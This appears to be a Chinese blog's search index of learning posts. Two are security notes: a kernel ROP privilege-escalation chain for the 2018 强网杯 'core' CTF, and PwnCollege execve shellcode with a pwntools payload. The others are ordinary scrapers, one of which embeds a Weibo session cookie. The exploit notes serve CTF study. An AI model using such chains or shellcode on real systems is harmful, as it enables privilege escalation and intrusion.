<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kernel_ROP-2018_强网杯-core</title>
    <link href="/2022/05/19/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/"/>
    <url>/2022/05/19/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/</url>
    
    <content type="html"><![CDATA[<p>初学kernel，做个笔记。</p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#_1">Kernel ROP - CTF Wiki</a></p><p>wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。</p><p>首先是对文件:</p><p>引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。</p><h1 id="Rop大体思路"><a href="#Rop大体思路" class="headerlink" title="Rop大体思路"></a>Rop大体思路</h1><p>栈上有Canary防护的话，需要先泄露出Canary，来促使Rop</p><p>Rop具体思路是和Libc中的类似，利用一些寄存器进行传值</p><p>调用commit_creds(prepare_kernel_cred(0))来提权</p><p>最后回到用户态就可以system(‘bin&#x2F;sh’)</p><p>思路是很好想的，但是具体是shellcode的写法。</p><p>我们ropper出来的gadget中一部分是不能用的，而且也不是每次都能找到完美适合的gadget，这就比较考验我们写shellcode的功底。</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>拿wiki上的shellcode来分析</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">rop[i++] = <span class="hljs-number">0</span>xffffffff81000b2f + offset; <span class="hljs-regexp">//</span> pop rdi; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred;         <span class="hljs-regexp">//</span> prepare_kernel_cred(<span class="hljs-number">0</span>)<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff810a0f49 + offset; <span class="hljs-regexp">//</span> pop rdx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff81021e53 + offset; <span class="hljs-regexp">//</span> pop rcx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff8101aa6a + offset; <span class="hljs-regexp">//</span> mov rdi, rax; call rdx; <br>rop[i++] = commit_creds;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81a012da + offset; <span class="hljs-regexp">//</span> swapgs; popfq; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81050ac2 + offset; <span class="hljs-regexp">//</span> iretq; ret; <br><br>rop[i++] = (size_t)spawn_shell;         <span class="hljs-regexp">//</span> rip <br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>并且因为执行了mov rdi ，ra<br></code></pre></td></tr></table></figure><p>x(rax一般作为返回值寄存器)rdi作为参数传递。然后swapgs 恢复寄存器的值，再用iretq 跳回用户态，这样就利用.ko文件的漏洞当前这个进程提权了，再进行system(‘bin&#x2F;sh’)就ok了</p><p>&#96;rop[i++] &#x3D; 0xffffffff81000b2f + offset; &#x2F;&#x2F; pop rdi; ret<br>rop[i++] &#x3D; 0;<br>rop[i++] &#x3D; prepare_kernel_cred;         &#x2F;&#x2F; prepare_kernel_cred(0)</p><p>rop[i++] &#x3D; 0xffffffff810a0f49 + offset; &#x2F;&#x2F; pop rdx; ret<br>rop[i++] &#x3D; 0xffffffff81021e53 + offset; &#x2F;&#x2F; pop rcx; ret<br>rop[i++] &#x3D; 0xffffffff8101aa6a + offset; &#x2F;&#x2F; mov rdi, rax; call rdx;<br>rop[i++] &#x3D; commit_creds;&#96;</p><p>这部分的栈操作我分析了半个小时，shellcode功底并不好，后续还需要继续学习。原因是把call指令记错了。call 指令会先把当前的rip压入栈中，然后在进行jmp。这样在call rdx ，rdx再去执行pop rcx ；ret；时，ret就可以执行commit_creds 。如果 没有push操作，就会把commit_creds pop给了rcx，产生错误的理解。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnCollege_shellcode第一章</title>
    <link href="/2022/05/17/Pwncollege_shellocode_1/"/>
    <url>/2022/05/17/Pwncollege_shellocode_1/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=715v_-YnpT8">课程链接</a></p><h1 id="漏洞程序-hello-c"><a href="#漏洞程序-hello-c" class="headerlink" title="漏洞程序 hello.c"></a>漏洞程序 hello.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bye1</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bye2</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Farewell!&quot;</span>); &#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-type">char</span> * name ,<span class="hljs-type">void</span> (* bye_func)())</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello , %s\n&quot;</span>,name);<br>bye_func();<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span>&#123;<br><span class="hljs-type">char</span> name[<span class="hljs-number">1024</span>];<br>gets(name);<br>srand(time(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">if</span>(rand()%<span class="hljs-number">2</span>) hello(bye1,name);<br> <span class="hljs-keyword">else</span> hello(name,bye2);<br>&#125;<br></code></pre></td></tr></table></figure><p>GCC编译，1&#x2F;2的概率程序崩溃</p><p><img src="/img/pwncollege-1.png" alt="pwncollege-1"></p><h1 id="shellcode-s"><a href="#shellcode-s" class="headerlink" title="shellcode.s"></a>shellcode.s</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start           #.global定义一个全局符号 _start 为程序的入口<br>_start:                  # _start: 标志程序入口<br>.intel_syntax noprefix   #intel代码格式<br>  mov rax, 59          #系统调用号  <br>lea rdi, [rip+binsh] #binsh偏移<br>mov rsi, 0<br>mov rdx, 0<br>syscall<br>binsh:                  #binsh标号<br>.string &quot;/bin/sh&quot;   #.string 标志string类型<br></code></pre></td></tr></table></figure><p>编译运行</p><p><img src="/img/pwncollege-2.png" alt="pwncollege-2"></p><p>objdump 看一下section</p><p><img src="/img/pwncollege-3.png" alt="pwncollege-3"></p><p> 其实到这里对于shellcode已经是可以使用了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./hello&#x27;</span>)<br>payload=<span class="hljs-string">&quot;\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/pwncollege-4.png" alt="pwncollege-4"></p><p>视频中演示了另一种方法，利用objcpoy 将代码段部分转移到shellcode-raw文件中</p><p><img src="/img/pwncollege-6.png" alt="pwncollege-6"></p><p>（hd &#x3D;hexdump）用十六进制把二进制文件打印出来</p><p><img src="/img/pwncollege-5.png" alt="pwncollege-5"></p><p> 利用管道符（这行指令还没太看明白，但是用的应该不多，不去深究了）</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫抓取百度图片</title>
    <link href="/2022/04/30/BDtpCrawler/"/>
    <url>/2022/04/30/BDtpCrawler/</url>
    
    <content type="html"><![CDATA[<p>借鉴了csdn上某位带佬的代码，代码顶部有引用。</p><p>速度比我个人写的快很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Created on Sun Sep 13 21:35:34 2020</span><br><span class="hljs-string">@author: ydc</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> error<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> os<br><br>num = <span class="hljs-number">0</span><br>numPicture = <span class="hljs-number">0</span><br>file = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-type">List</span> = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Find</span>(<span class="hljs-params">url, A</span>):<br>    <span class="hljs-keyword">global</span> <span class="hljs-type">List</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在检测图片总数，请稍等.....&#x27;</span>)<br>    t = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">1</span><br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> t &lt; <span class="hljs-number">1000</span>:<br>        Url = url + <span class="hljs-built_in">str</span>(t)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 这里搞了下</span><br>            Result = A.get(Url, timeout=<span class="hljs-number">7</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">except</span> BaseException:<br>            t = t + <span class="hljs-number">60</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            result = Result.text<br>            pic_url = re.findall(<span class="hljs-string">&#x27;&quot;objURL&quot;:&quot;(.*?)&quot;,&#x27;</span>, result, re.S)  <span class="hljs-comment"># 先利用正则表达式找到图片url</span><br>            s += <span class="hljs-built_in">len</span>(pic_url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pic_url) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-type">List</span>.append(pic_url)<br>                t = t + <span class="hljs-number">60</span><br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend</span>(<span class="hljs-params">url</span>):<br>    Re = []<br>    <span class="hljs-keyword">try</span>:<br>        html = requests.get(url, allow_redirects=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> error.HTTPError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">else</span>:<br>        html.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>        bsObj = BeautifulSoup(html.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        div = bsObj.find(<span class="hljs-string">&#x27;div&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;topRS&#x27;</span>)<br>        <span class="hljs-keyword">if</span> div <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            listA = div.findAll(<span class="hljs-string">&#x27;a&#x27;</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> listA:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    Re.append(i.get_text())<br>        <span class="hljs-keyword">return</span> Re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dowmloadPicture</span>(<span class="hljs-params">html, keyword</span>):<br>    <span class="hljs-keyword">global</span> num<br>    <span class="hljs-comment"># t =0</span><br>    pic_url = re.findall(<span class="hljs-string">&#x27;&quot;objURL&quot;:&quot;(.*?)&quot;,&#x27;</span>, html, re.S)  <span class="hljs-comment"># 先利用正则表达式找到图片url</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;找到关键词:&#x27;</span> + keyword + <span class="hljs-string">&#x27;的图片，即将开始下载图片...&#x27;</span>)<br>    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> pic_url:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在下载第&#x27;</span> + <span class="hljs-built_in">str</span>(num + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;张图片，图片地址:&#x27;</span> + <span class="hljs-built_in">str</span>(each))<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> each <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                pic = requests.get(each, timeout=<span class="hljs-number">7</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">except</span> BaseException:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误，当前图片无法下载&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            string = file + <span class="hljs-string">r&#x27;\\&#x27;</span> + keyword + <span class="hljs-string">&#x27;_&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;.jpg&#x27;</span><br>            fp = <span class="hljs-built_in">open</span>(string, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>            fp.write(pic.content)<br>            fp.close()<br>            num += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> num &gt;= numPicture:<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:  <span class="hljs-comment"># 主函数入口</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>&#125;<br><br>A = requests.Session()<br>A.headers = headers<br><br><span class="hljs-comment">###############################</span><br><br>tm = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入每类图片的下载数量 &#x27;</span>))<br>numPicture = tm<br>line_list = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./name.txt&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    line_list = [k.strip() <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> file.readlines()]  <span class="hljs-comment"># 用 strip()移除末尾的空格</span><br><br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> line_list:<br>    url = <span class="hljs-string">&#x27;https://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word=&#x27;</span> + word + <span class="hljs-string">&#x27;&amp;pn=&#x27;</span><br>    tot = Find(url, A)<br>    Recommend = recommend(url)  <span class="hljs-comment"># 记录相关推荐</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;经过检测%s类图片共有%d张&#x27;</span> % (word, tot))<br>    file = word + <span class="hljs-string">&#x27;文件&#x27;</span><br>    y = os.path.exists(file)<br>    <span class="hljs-keyword">if</span> y == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;该文件已存在，请重新输入&#x27;</span>)<br>        file = word + <span class="hljs-string">&#x27;文件夹2&#x27;</span><br>        os.mkdir(file)<br>    <span class="hljs-keyword">else</span>:<br>        os.mkdir(file)<br>    t = <span class="hljs-number">0</span><br>    tmp = url<br>    <span class="hljs-keyword">while</span> t &lt; numPicture:<br>        <span class="hljs-keyword">try</span>:<br>            url = tmp + <span class="hljs-built_in">str</span>(t)<br><br>            <span class="hljs-comment"># result = requests.get(url, timeout=10)</span><br><br>            <span class="hljs-comment"># 这里搞了下</span><br>            result = A.get(url, timeout=<span class="hljs-number">10</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>           <span class="hljs-built_in">print</span>(url)<br>        <span class="hljs-keyword">except</span> error.HTTPError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;网络错误，请调整网络后重试&#x27;</span>)<br>            t = t + <span class="hljs-number">60</span><br>        <span class="hljs-keyword">else</span>:<br>            dowmloadPicture(result.text, word)<br>            t = t + <span class="hljs-number">60</span><br>   numPicture = numPicture + tm<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前搜索结束，感谢使用&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
      <category>百度图片</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫抓取词语同义词</title>
    <link href="/2022/03/13/cikucrawler/"/>
    <url>/2022/03/13/cikucrawler/</url>
    
    <content type="html"><![CDATA[<p>爬虫下来的词语会写在同级文件夹下的txt文件</p><p>代码演示的是爬取无聊的同义词</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pa</span>(<span class="hljs-params">ci</span>):<br>    datalist=[]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(ci+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>      datalist=f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(datalist)):<br>        datalist[i]=datalist[i].strip()<br>    <span class="hljs-built_in">print</span>(datalist)<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> datalist:<br>     time.sleep(<span class="hljs-number">0.1</span>)<br>     <span class="hljs-built_in">print</span>(data+<span class="hljs-string">&quot;的近义词&quot;</span>)<br>     url=<span class="hljs-string">&quot;https://hanyu.baidu.com/s&quot;</span><br>     param=&#123;<br>        <span class="hljs-string">&quot;wd&quot;</span>:data.encode(),<br>        <span class="hljs-string">&quot;ptype&quot;</span>:<span class="hljs-string">&quot;zici&quot;</span>,<br>     &#125;<br>     headers=&#123;<br>       <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span>,<br>     &#125;<br>     resp=requests.get(url,params=param,headers=headers)  <span class="hljs-comment">#verify = Flase 去掉安全验证</span><br>     page_content=resp.text<br>     index1=page_content.find(<span class="hljs-string">&quot;&lt;label&gt;近义词 &lt;/label&gt;&quot;</span>)<br>     page_content=page_content[index1:]<br>     index2=page_content.find(<span class="hljs-string">&quot;&lt;label&gt;反义词 &lt;/label&gt; &quot;</span>)<br>     page_content=page_content[:index2]<br>     index3=page_content.find(<span class="hljs-string">&quot;&lt;h1&gt;热搜字词&lt;/h1&gt;&quot;</span>)<br>     page_content=page_content[:index3]<br>     obj=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;a href=.*?&gt;(?P&lt;word1&gt;.*?)&lt;/a&gt;&quot;</span>,re.S)<br>     result=obj.finditer(page_content)<br>     <span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> result:<br>       f=<span class="hljs-built_in">open</span>(ci+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>       <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;百科&quot;</span><span class="hljs-keyword">in</span> it.group(<span class="hljs-string">&quot;word1&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;百度&quot;</span> <span class="hljs-keyword">in</span> it.group(<span class="hljs-string">&quot;word1&quot;</span>)):<br>           <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">if</span>(it.group(<span class="hljs-string">&quot;word1&quot;</span>)<span class="hljs-keyword">in</span> datalist):<br>           <span class="hljs-keyword">break</span><br>       f.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>       f.write(it.group(<span class="hljs-string">&quot;word1&quot;</span>))<br>       f.close()<br><br>pa(<span class="hljs-string">&quot;无聊&quot;</span>)<br></code></pre></td></tr></table></figure><p>如果需要更多的同义词， 反复运气3-5次程序即可。</p><p>因为百度汉语给出的同义词并不是我们意义上的同义词。</p><p>例如 “生气”的同义词我们会想到“愤怒”</p><p>但是在百度汉语中“生气”会作为“生气勃勃” 的意思，进而会给出“活泼” 的近义词。</p><p>所以仍然需要对抓取下来的词库进行第二次处理。</p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
      <category>百度汉语</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫抓取微博热搜榜单</title>
    <link href="/2021/12/09/weibocrawler/"/>
    <url>/2021/12/09/weibocrawler/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&quot;https://s.weibo.com/top/summary?Refer=top_hot&amp;topnav=1&amp;wvr=6&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span><br>    , <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;UOR=www.huiyi8.com,widget.weibo.com,www.huiyi8.com; SINAGLOBAL=2637637648891.33.1630215838590; ULV=1630215838591:1:1:1:2637637648891.33.1630215838590:; SUB=_2AkMW_nogf8NxqwJRmfgVzG7mbIhyzA_EieKgoov7JRMxHRl-yT8XqkBYtRB6PX5UwoLid6hE2_VZ1IleEqWgAAIWUIyf; SUBP=0033WrSXqPxfM72-Ws9jqgMF55529P9D9W5j30oGSN6ZPAI5Z2TfrawQ&quot;</span><br>&#125;<br><span class="hljs-comment"># 3获取网页数据</span><br>r = requests.get(url, headers=headers)<br>obj=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;td class=&quot;td-01 ranktop&quot;&gt;(?P&lt;rank&gt;\d+)&lt;/td&gt;.*?&lt;td class=&quot;td-02&quot;&gt;.*?&lt;a href=&quot;(?P&lt;href&gt;.*?)&quot; target=&quot;_blank&quot;&gt;(?P&lt;resou&gt;.*?)&lt;/a&gt;&#x27;</span>,re.S)<br>result=obj.finditer(r.text)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>    <span class="hljs-built_in">print</span>(i.group(<span class="hljs-string">&quot;resou&quot;</span>))<br><br></code></pre></td></tr></table></figure><p>用的是正则表达式匹配热搜榜，所以功能有限，只能活的一些普通的数据</p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
      <category>热搜榜单</category>
